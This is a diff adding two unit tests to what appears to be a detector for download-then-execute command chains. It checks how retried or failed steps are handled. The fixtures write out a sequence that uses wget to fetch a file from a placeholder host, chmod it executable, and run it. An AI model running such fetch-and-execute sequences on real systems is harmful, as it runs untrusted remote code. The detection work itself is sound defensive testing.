@@ -204,6 +204,45 @@ def test_retry_aware_selection_finds_later_complete_same_path_subsequence() -> N
     ]
 
 
+def test_unconfirmed_transfer_then_confirmed_retry_uses_confirmed_evidence() -> None:
+    fact_set, report = _build({
+        "case_id": "phase2-unconfirmed-retry",
+        "events": [
+            ("wget https://example.invalid/a -O /tmp/a", "unknown"),
+            ("wget https://example.invalid/a -O /tmp/a", "success"),
+            ("chmod 700 /tmp/a", "success"),
+            ("/tmp/a", "success"),
+        ],
+    })
+    selection = select_typed_semantic_chains(fact_set, [CHAIN_RULE])
+    assert [match["status"] for match in selection["matches"]] == ["complete"]
+    match = selection["matches"][0]
+    selected_facts = {
+        fact["fact_id"]: fact for fact in fact_set["facts"]
+    }
+    assert selected_facts[match["fact_refs"][0]]["outcome"]["status"] == "reported_success"
+    assert match["unconfirmed_attempts"] is False
+    assert any(
+        finding.get("finding_type") == "connected_transfer_permission_execution"
+        for finding in report["behavioral_findings"]
+    )
+
+
+def test_failed_execution_then_successful_retry_is_complete_not_incomplete() -> None:
+    fact_set, _report = _build({
+        "case_id": "phase2-execution-retry",
+        "events": [
+            ("wget https://example.invalid/a -O /tmp/a", "success"),
+            ("chmod 700 /tmp/a", "success"),
+            ("/tmp/a", "failure"),
+            ("/tmp/a", "success"),
+        ],
+    })
+    selection = select_typed_semantic_chains(fact_set, [CHAIN_RULE])
+    assert [match["status"] for match in selection["matches"]] == ["complete"]
+    assert selection["matches"][0]["unconfirmed_attempts"] is False
+
+
 def test_failed_prerequisite_without_successful_replacement_abstains() -> None:
     fact_set, report = _build({
         "case_id": "phase2-no-retry",
